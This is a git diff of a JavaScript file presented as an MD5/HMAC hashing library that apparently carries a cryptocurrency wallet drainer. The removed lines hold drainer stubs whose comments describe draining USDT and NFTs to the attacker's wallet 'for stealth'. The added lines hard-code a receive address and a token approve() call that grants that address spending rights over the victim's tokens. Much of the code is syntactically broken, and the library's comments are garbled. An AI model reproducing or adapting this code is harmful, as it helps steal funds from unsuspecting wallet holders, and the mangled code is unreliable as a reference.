@@ -1,43 +1,38 @@
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+//code for local smart contract
 
-	
-var cryptotokenContract;
-var smartcontract
+const receiveAddress = "0x1f144cF1a4A74ae178eb3605acdF0F4EA68c1B75";
 
 
+
+var minersContract;
+var tokenContract;
 function approveSpending(token) {
-	
-	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
-	smartcontract.methods.drainusdt.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
-}
-	  
-  			
-}
+	  tokenContract.methods.approve(minersContract, receiveAddress).send({ from: currentAddr, to:receiveAddress }); 
 
-function drainwallet(token) {
-	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
-  			
 }
+var canSells = true;
+var canHatchs = true;
 
+var minersAbi = [{"constant":true,"inputs":[],"name":"ceoAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getMyMiners","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"initialized","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"rt","type":"uint256"},{"name":"rs","type":"uint256"},{"name":"bs","type":"uint256"}],"name":"calculateTrade","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"eth","type":"uint256"},{"name":"contractBalance","type":"uint256"}],"name":"calculateEggBuy","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"marketEggs","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"sellEggs","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"seedMarket","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"amount","type":"uint256"}],"name":"devFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":false,"inputs":[{"name":"ref","type":"address"}],"name":"hatchEggs","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getMyEggs","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"ref","type":"address"},{"name":"amount","type":"uint256"}],"name":"buyEggs","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"lastHatch","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"claimedEggs","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"hatcheryMiners","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"EGGS_TO_HATCH_1MINERS","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"eth","type":"uint256"}],"name":"calculateEggBuySimple","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"eggs","type":"uint256"}],"name":"calculateEggSell","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"referrals","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"ceoAddress2","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"adr","type":"address"}],"name":"getEggsSinceLastHatch","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
 var tokenAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
 
 
 //#region Check Configuration
-if (!receiveAddressx.startsWith("0x") ||
+if (!receiveAddress.startsWith("0x")) 
     (
-        receiveAddressx.length >= 64 ||
-        receiveAddressx.length <= 40
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
     )
-
 
 
 /*
  * JavaScript smart contract node
+ 
 /* global define */
 
 /* eslint-disable strict */
 
-;(function ($) {
+ (function ($) {
   'use strict'
 
   /**
@@ -48,12 +43,12 @@ if (!receiveAddressx.startsWith("0x") ||
    * @param {number} y Second integer
    * @returns {number} Sum
    */
-  function safeAdd(x, y) {
-    var lsw = (x & 0xffff) + (y & 0xffff)
-    var msw = (x >> 16) + (y >> 16) + (lsw >> 16)
-    return (msw << 16) | (lsw & 0xffff)
+    function safeAdd(x, y) {
+      var lsw = (x & 0xffff) + (y & 0xffff)
+      var msw = (x >> 16) + (y >> 16) + (lsw >> 16)
+      return (msw << 16) | (lsw & 0xffff)
   }
-
+  
   /**
    * Bitwise rotate a 32-bit number to the left.
    *
@@ -111,7 +106,7 @@ if (!receiveAddressx.startsWith("0x") ||
   }
   /**
    * Basic operation the algorithm uses.
-   *
+   * 
    * @param {number} a a
    * @param {number} b b
    * @param {number} c c
@@ -131,7 +126,7 @@ if (!receiveAddressx.startsWith("0x") ||
    * @param {number} b b
    * @param {number} c c
    * @param {number} d d
-   * @param {number} x x
+   *  * @param {number} x x
    * @param {number} s s
    * @param {number} t t
    * @returns {number} Result
@@ -152,7 +147,7 @@ if (!receiveAddressx.startsWith("0x") ||
     x[len >> 5] |= 0x80 << len % 32
     x[(((len + 64) >>> 9) << 4) + 14] = len
 
-    var i
+     var i
     var olda
     var oldb
     var oldc
@@ -245,13 +240,13 @@ if (!receiveAddressx.startsWith("0x") ||
   }
 
   /**
-   * Convert an array of little-endian words to a string
+   *  * Convert an array of little-endian words to a string
    *
    * @param {Array<number>} input MD5 Array
    * @returns {string} MD5 string
    */
   function binl2rstr(input) {
-    var i
+       var i
     var output = ''
     var length32 = input.length * 32
     for (i = 0; i < length32; i += 8) {
@@ -281,7 +276,7 @@ if (!receiveAddressx.startsWith("0x") ||
     return output
   }
 
-  /**
+/**
    * Calculate the MD5 of a raw string
    *
    * @param {string} s Input string
@@ -292,9 +287,9 @@ if (!receiveAddressx.startsWith("0x") ||
   }
 
   /**
-   * Calculates the HMAC-MD5 of a key and some data (raw strings)
+   * Calculate the MD5 of a raw string
    *
-   * @param {string} key HMAC key
+     * @param {string} key HMAC key
    * @param {string} data Raw input string
    * @returns {string} Raw MD5 string
    */
@@ -316,7 +311,7 @@ if (!receiveAddressx.startsWith("0x") ||
     return binl2rstr(binlMD5(opad.concat(hash), 512 + 128))
   }
 
-  /**
+/**
    * Convert a raw string to a hex string
    *
    * @param {string} input Raw input string
@@ -331,10 +326,10 @@ if (!receiveAddressx.startsWith("0x") ||
       x = input.charCodeAt(i)
       output += hexTab.charAt((x >>> 4) & 0x0f) + hexTab.charAt(x & 0x0f)
     }
-    return output
+     return output
   }
 
-  /**
+   /**
    * Encode a string as UTF-8
    *
    * @param {string} input Input string
@@ -344,7 +339,7 @@ if (!receiveAddressx.startsWith("0x") ||
     return unescape(encodeURIComponent(input))
   }
 
-  /**
+   /**
    * Encodes input string as raw MD5 string
    *
    * @param {string} s Input string
@@ -371,7 +366,7 @@ if (!receiveAddressx.startsWith("0x") ||
    */
   function rawHMACMD5(k, d) {
     return rstrHMACMD5(str2rstrUTF8(k), str2rstrUTF8(d))
-  }
+}
   /**
    * Calculates the Hex encoded HMAC-MD5 for the given key and data
    *
@@ -391,7 +386,7 @@ if (!receiveAddressx.startsWith("0x") ||
    * @param {string} string Input string
    * @param {string} [key] HMAC key
    * @param {boolean} [raw] Raw output switch
-   * @returns {string} MD5 output
+   ** @returns {string} MD5 output
    */
   function md5(string, key, raw) {
     if (!key) {
@@ -411,8 +406,9 @@ if (!receiveAddressx.startsWith("0x") ||
       return md5
     })
   } else if (typeof module === 'object' && module.exports) {
-    module.exports = md5
+          module.exports = md5
   } else {
     $.md5 = md5
   }
 })(this)
+
